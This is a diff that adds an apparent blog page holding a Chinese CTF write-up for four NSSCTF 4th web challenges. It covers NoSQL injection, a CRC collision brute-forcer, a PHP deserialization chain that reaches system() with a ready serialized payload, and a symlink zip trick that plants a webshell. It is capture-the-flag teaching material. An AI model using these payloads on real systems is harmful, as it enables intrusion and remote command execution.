@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>NSSCTF 4th WEB Writeup | w8nn9z Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="NSSCTF 4th WEB Writeup - w8nn9z Blog">
+<meta name="author" content="">
+<link rel="canonical" href="https://z9nn8w.github.io/posts/ctf/nssctf-4th-web-writeup/">
+
+<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/ctf/nssctf-4th-web-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/nssctf-4th-web-writeup/">
+  <meta property="og:site_name" content="w8nn9z Blog">
+  <meta property="og:title" content="NSSCTF 4th WEB Writeup">
+  <meta property="og:locale" content="zh-cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-24T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-08-24T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="NSSCTF 4th WEB Writeup">
+<meta name="twitter:description" content="">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://z9nn8w.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTF",
+      "item": "https://z9nn8w.github.io/posts/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "NSSCTF 4th WEB Writeup",
+      "item": "https://z9nn8w.github.io/posts/ctf/nssctf-4th-web-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "NSSCTF 4th WEB Writeup",
+  "name": "NSSCTF 4th WEB Writeup",
+  "description": "",
+  "keywords": [
+    
+  ],
+  "articleBody": "ez_signin 题目给了附件，app.py：\nfrom flask import Flask, request, render_template, jsonify from pymongo import MongoClient import re app = Flask(__name__) client = MongoClient(\"mongodb://localhost:27017/\") db = client['aggie_bookstore'] books_collection = db['books'] def sanitize(input_str: str) -\u003e str: return re.sub(r'[^a-zA-Z0-9\\s]', '', input_str) @app.route('/') def index(): return render_template('index.html', books=None) @app.route('/search', methods=['GET', 'POST']) def search(): query = {\"$and\": []} books = [] if request.method == 'GET': title = request.args.get('title', '').strip() author = request.args.get('author', '').strip() title_clean = sanitize(title) author_clean = sanitize(author) if title_clean: query[\"$and\"].append({\"title\": {\"$eq\": title_clean}}) if author_clean: query[\"$and\"].append({\"author\": {\"$eq\": author_clean}}) if query[\"$and\"]: books = list(books_collection.find(query)) return render_template('index.html', books=books) elif request.method == 'POST': if request.content_type == 'application/json': try: data = request.get_json(force=True) title = data.get(\"title\") author = data.get(\"author\") if isinstance(title, str): title = sanitize(title) query[\"$and\"].append({\"title\": title}) elif isinstance(title, dict): query[\"$and\"].append({\"title\": title}) if isinstance(author, str): author = sanitize(author) query[\"$and\"].append({\"author\": author}) elif isinstance(author, dict): query[\"$and\"].append({\"author\": author}) if query[\"$and\"]: books = list(books_collection.find(query)) return jsonify([ {\"title\": b.get(\"title\"), \"author\": b.get(\"author\"), \"description\": b.get(\"description\")} for b in books ]) return jsonify({\"error\": \"Empty query\"}), 400 except Exception as e: return jsonify({\"error\": str(e)}), 500 return jsonify({\"error\": \"Unsupported Content-Type\"}), 400 if __name__ == \"__main__\": app.run(\"0.0.0.0\", 8000) flask+mongodb实现了一个BookStore根据title和author查询book的功能，如果是GET方式请求或是POST方式传参string，参数会被sanitize方法过滤，只允许大小写字母数字空格，无法实现NoSQL注入\n但如果是POST方式请求，传参格式为json，就不会进行任何过滤，且NoSQL注入刚好需要传入dict类型数据：\nEzCRC index.php：\n\u003c?php error_reporting(0); ini_set('display_errors', 0); highlight_file(__FILE__); function compute_crc16($data) { $checksum = 0xFFFF; for ($i = 0; $i \u003c strlen($data); $i++) { $checksum ^= ord($data[$i]); for ($j = 0; $j \u003c 8; $j++) { if ($checksum \u0026 1) { $checksum = (($checksum \u003e\u003e 1) ^ 0xA001); } else { $checksum \u003e\u003e= 1; } } } return $checksum; } function calculate_crc8($input) { static $crc8_table = [ 0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15, 0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D, 0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65, 0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D, 0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5, 0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD, 0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85, 0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD, 0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2, 0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA, 0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2, 0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A, 0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32, 0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A, 0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42, 0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A, 0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C, 0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4, 0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC, 0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4, 0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C, 0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44, 0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C, 0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34, 0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B, 0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63, 0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B, 0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13, 0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB, 0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83, 0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB, 0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3 ]; $bytes = unpack('C*', $input); $length = count($bytes); $crc = 0; for ($k = 1; $k \u003c= $length; $k++) { $crc = $crc8_table[($crc ^ $bytes[$k]) \u0026 0xff]; } return $crc \u0026 0xff; } $SECRET_PASS = \"Enj0yNSSCTF4th!\"; include \"flag.php\"; if (isset($_POST['pass']) \u0026\u0026 strlen($SECRET_PASS) == strlen($_POST['pass'])) { $correct_pass_crc16 = compute_crc16($SECRET_PASS); $correct_pass_crc8 = calculate_crc8($SECRET_PASS); $user_input = $_POST['pass']; $user_pass_crc16 = compute_crc16($user_input); $user_pass_crc8 = calculate_crc8($user_input); if ($SECRET_PASS === $user_input) { die(\"这样不行\"); } if ($correct_pass_crc16 !== $user_pass_crc16) { die(\"这样也不行\"); } if ($correct_pass_crc8 !== $user_pass_crc8) { die(\"这样还是不行吧\"); } $granted_access = true; if ($granted_access) { echo \"都到这份上了,flag就给你了: $FLAG\"; } else { echo \"不不不\"; } } else { echo \"再试试\"; } ?\u003e 实现了CRC16和CRC8的验证，要求长度和所给$SECRET_PASS一样\n直接爆破，一开始写的python脚本，发现python的len和php的strlen对某些字符的长度判断不同，后来改用php写，只是爆破速度慢一些：\n\u003c?php function compute_crc16($data) { $checksum = 0xFFFF; for ($i = 0; $i \u003c strlen($data); $i++) { $checksum ^= ord($data[$i]); for ($j = 0; $j \u003c 8; $j++) { if ($checksum \u0026 1) { $checksum = (($checksum \u003e\u003e 1) ^ 0xA001); } else { $checksum \u003e\u003e= 1; } } } return $checksum; } function calculate_crc8($input) { static $crc8_table = [ 0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15, 0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D, 0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65, 0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D, 0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5, 0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD, 0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85, 0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD, 0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2, 0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA, 0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2, 0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A, 0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32, 0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A, 0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42, 0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A, 0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C, 0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4, 0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC, 0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4, 0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C, 0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44, 0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C, 0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34, 0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B, 0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63, 0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B, 0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13, 0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB, 0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83, 0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB, 0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3 ]; $bytes = unpack('C*', $input); $length = count($bytes); $crc = 0; for ($k = 1; $k \u003c= $length; $k++) { $crc = $crc8_table[($crc ^ $bytes[$k]) \u0026 0xff]; } return $crc \u0026 0xff; } $SECRET_PASS = \"Enj0yNSSCTF4th!\"; $target_crc16 = compute_crc16($SECRET_PASS); $target_crc8 = calculate_crc8($SECRET_PASS); echo \"目标CRC16: $target_crc16\\n\"; echo \"目标CRC8: $target_crc8\\n\"; echo \"开始爆破...\\n\"; $found = false; $attempts = 0; while (!$found) { $attempts++; // 生成随机15字节字符串 $random_bytes = ''; for ($i = 0; $i \u003c 15; $i++) { $random_bytes .= chr(random_int(0, 255)); } // 跳过原始密码 if ($random_bytes === $SECRET_PASS) { continue; } $crc16 = compute_crc16($random_bytes); $crc8 = calculate_crc8($random_bytes); if ($crc16 === $target_crc16 \u0026\u0026 $crc8 === $target_crc8) { $found = true; echo \"尝试次数: $attempts\\n\"; echo \"碰撞字符串: \" . bin2hex($random_bytes) . \"\\n\"; echo \"CRC16: $crc16, CRC8: $crc8\\n\"; echo \"pass=\" . urlencode($random_bytes) . \"\\n\"; } // 显示进度 if ($attempts % 10000 === 0) { echo \"已尝试 $attempts 次...\\n\"; } } [mpga]filesystem 题目给了www.zip备份文件，反序列化漏洞点位于：\nif ($action === 'home' \u0026\u0026 isset($_POST['submit_md5'])) { $filename_param = isset($_POST['file_to_check']) ? $_POST['file_to_check'] : ''; if (!empty($filename_param)) { $file_object = @unserialize($filename_param); if ($file_object === false || !($file_object instanceof FileManager)) { $file_object = new FileManager($filename_param); } $output = $file_object-\u003egetFileHash(); } else { $output = \"请输入文件路径进行MD5校验。\n\"; } } submit_md5随便传一个值就能触发unserialize，构造的序列化字符串放在file_to_check传入即可，接下来就是构造链子，先看一下有哪些class：\n\u003c?php class ApplicationContext{ public $contextName; public function __construct(){ $this-\u003econtextName = 'ApplicationContext'; } public function __destruct(){ $this-\u003econtextName = strtolower($this-\u003econtextName); } } class ContentProcessor{ private $processedContent; public $callbackFunction; public function __construct(){ $this-\u003eprocessedContent = new FunctionInvoker(); } public function __get($key){ if (property_exists($this, $key)) { if (is_object($this-\u003e$key) \u0026\u0026 is_string($this-\u003ecallbackFunction)) { $this-\u003e$key-\u003e{$this-\u003ecallbackFunction}($_POST['cmd']); } } } } class FileManager{ public $targetFile; public $responseData = 'default_response'; public function __construct($targetFile = null){ $this-\u003etargetFile = $targetFile; } public function filterPath(){ if(preg_match('/^\\/|php:|data|zip|\\.\\.\\//i',$this-\u003etargetFile)){ die('文件路径不符合规范'); } } public function performWriteOperation($var){ $targetObject = $this-\u003etargetFile; $value = $targetObject-\u003e$var; } public function getFileHash(){ $this-\u003efilterPath(); if (is_string($this-\u003etargetFile)) { if (file_exists($this-\u003etargetFile)) { $md5_hash = md5_file($this-\u003etargetFile); return \"文件MD5哈希: \" . htmlspecialchars($md5_hash); } else { die(\"文件未找到\"); } } else if (is_object($this-\u003etargetFile)) { try { $md5_hash = md5_file($this-\u003etargetFile); return \"文件MD5哈希 (尝试): \" . htmlspecialchars($md5_hash); } catch (TypeError $e) { return \"无法计算MD5哈希，因为文件参数无效: \" . htmlspecialchars($e-\u003egetMessage()); } } else { die(\"文件未找到\"); } } public function __toString(){ if (isset($_POST['method']) \u0026\u0026 method_exists($this, $_POST['method'])) { $method = $_POST['method']; $var = isset($_POST['var']) ? $_POST['var'] : null; $this-\u003e$method($var); } return $this-\u003eresponseData; } } class FunctionInvoker{ public $functionName; public $functionArguments; public function __call($name, $arg){ if (function_exists($name)) { $name($arg[0]); } } } 只有ApplicationContext类中有__destruct方法，这条链从入口开始找比较方便，__destruct方法中调用了strtolower函数，将contextName成员置为FileManager类的实例就能继续执行__toString方法，将method置为performWriteOperation，就能进入performWriteOperation方法，只需要再将targetObject置为ContentProcessor类的实例再将var置为processedContent，尝试访问private成员就会调用ContentProcessor类的__get方法，最后就是命令执行的部分，将callbackFunction置为system，尝试访问FunctionInvoker类中不存在的方法就会调用__call方法，只需再传入cmd为要执行的命令就能实现RCE，完整的链子：\nApplicationContext.__destruct -\u003e FileManager.__toString -\u003e FileManager.performWriteOperation -\u003e ContentProcessor.__get -\u003e FunctionInvoker.__call exp：\n\u003c?php class ApplicationContext{ public $contextName; } class ContentProcessor{ private $processedContent; public $callbackFunction; public function __construct(){ $this-\u003eprocessedContent = new FunctionInvoker(); } } class FileManager{ public $targetFile; public $responseData = 'default_response'; } class FunctionInvoker{ } $a = new ApplicationContext(); $b = new FileManager(); $a-\u003econtextName = $b; // 触发__toString method=performWriteOperation\u0026var=processedContent $c = new ContentProcessor(); $c-\u003ecallbackFunction = \"system\"; $b-\u003etargetFile = $c; // 触发__get cmd=whoami print(urlencode(serialize($a))); ?\u003e 生成的序列化字符串：\nO%3A18%3A%22ApplicationContext%22%3A1%3A%7Bs%3A11%3A%22contextName%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A0%3A%7B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D%7D ez_upload 比赛过程中给了一条hint：ez_upload: php -S\nPHP\u003c=7.4.21存在远程源码泄露漏洞：\nindex.php：\n\u003c?php error_reporting(0); $finfo = finfo_open(FILEINFO_MIME_TYPE); if (finfo_file($finfo, $_FILES[\"file\"][\"tmp_name\"]) === 'application/zip'){ exec('cd /tmp \u0026\u0026 unzip -o ' . $_FILES[\"file\"][\"tmp_name\"]); }; ?\u003e 拿到源码的时候比赛已经快结束了，赛后仔细分析一遍，先看finfo_open函数和参数FILEINFO_MIME_TYPE：\nfunction finfo_open(int $flags = 0, ?string $magic_database = null): finfo|false { } @param int $flags — One or disjunction of more Fileinfo constants. @param string|null $magic_database FILEINFO_MIME_TYPE (int) Return the mime type. finfo_open函数打开一个魔数数据库并且返回它的资源句柄，指向底层系统资源的引用，本地环境var_dump看一下具体是什么内容：\nresource(2) of type (file_info) 再看一下全局数据$FILE：\n$_FILES[\"file\"][\"name\"] - 上传文件的名称\r$_FILES[\"file\"][\"type\"] - 上传文件的类型\r$_FILES[\"file\"][\"size\"] - 上传文件的大小，以字节计\r$_FILES[\"file\"][\"tmp_name\"] - 存储在服务器的文件的临时副本的名称 // 临时目录位置由php.ini决定 echo ini_get('upload_tmp_dir');\r$_FILES[\"file\"][\"error\"] - 由文件上传导致的错误代码 简单来说finfo_file($finfo, $_FILES[\"file\"][\"tmp_name\"]) === 'application/zip'用于判断文件类型是否为zip类型，严格限制了只能上传zip类型的文件\nphp有个临时文件的机制，对于上传的文件都会临时在upload_tmp_dir目录下保存一个副本phpXXXXXX.tmp (在windows下有tmp后缀，linux没有)，在php程序正常结束时被删除，但是如果php程序崩溃或非正常结束，那么临时文件就会被保存下来\n本题利用的是linux的软链接特性，类似windows上的快捷方式，创建软链接会有一个类似文件夹的文件产生，里面连通被指向的目录，需要题目环境执行解压操作才能实现任意路径写入webshell\nln -s创建软链接文件link，指向/var/www/html：\nln -s /var/www/html link 将link软链接打包成zip压缩包：\nzip --symlinks link1.zip link 在link中放入木马文件shell.php，将link以及shell.php一并打包为zip压缩包：\nzip -r link2.zip link 再依次上传两个zip压缩包，先上传link1.zip，在/tmp目录下创建一个指向/var/www/html的软链接，再上传link2.zip，其中的shell.php会被直接解压到软链接指向的/var/www/html目录下，实现任意路径webshell的写入，最后蚁剑连接就能拿到shell，flag在根目录下：NSSCTF{y0u_ar3_50ft_l1nk_m4st3r!!!!}\n参考资料：\nhttps://cn-sec.com/archives/1634720.html\nhttps://www.cnblogs.com/linuxsec/articles/11278477.html\nhttps://0ran9e.fun/2024/09/02/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2023ciscn-Unzip/\n",
+  "wordCount" : "3552",
+  "inLanguage": "en",
+  "datePublished": "2025-08-24T00:00:00Z",
+  "dateModified": "2025-08-24T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://z9nn8w.github.io/posts/ctf/nssctf-4th-web-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "w8nn9z Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://z9nn8w.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/posts" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/about" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      NSSCTF 4th WEB Writeup
+    </h1>
+    <div class="post-meta"><span title='2025-08-24 00:00:00 +0000 UTC'>August 24, 2025</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details >
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">Table of Contents</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#ez_signin" aria-label="ez_signin">ez_signin</a></li>
+                    <li>
+                        <a href="#ezcrc" aria-label="EzCRC">EzCRC</a></li>
+                    <li>
+                        <a href="#mpgafilesystem" aria-label="[mpga]filesystem">[mpga]filesystem</a></li>
+                    <li>
+                        <a href="#ez_upload" aria-label="ez_upload">ez_upload</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><h2 id="ez_signin">ez_signin<a hidden class="anchor" aria-hidden="true" href="#ez_signin">#</a></h2>
+<p>题目给了附件，app.py：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, render_template, jsonify
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pymongo <span style="color:#f92672">import</span> MongoClient
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>client <span style="color:#f92672">=</span> MongoClient(<span style="color:#e6db74">&#34;mongodb://localhost:27017/&#34;</span>)
+</span></span><span style="display:flex;"><span>db <span style="color:#f92672">=</span> client[<span style="color:#e6db74">&#39;aggie_bookstore&#39;</span>]
+</span></span><span style="display:flex;"><span>books_collection <span style="color:#f92672">=</span> db[<span style="color:#e6db74">&#39;books&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sanitize</span>(input_str: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> re<span style="color:#f92672">.</span>sub(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;[^a-zA-Z0-9\s]&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, input_str)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
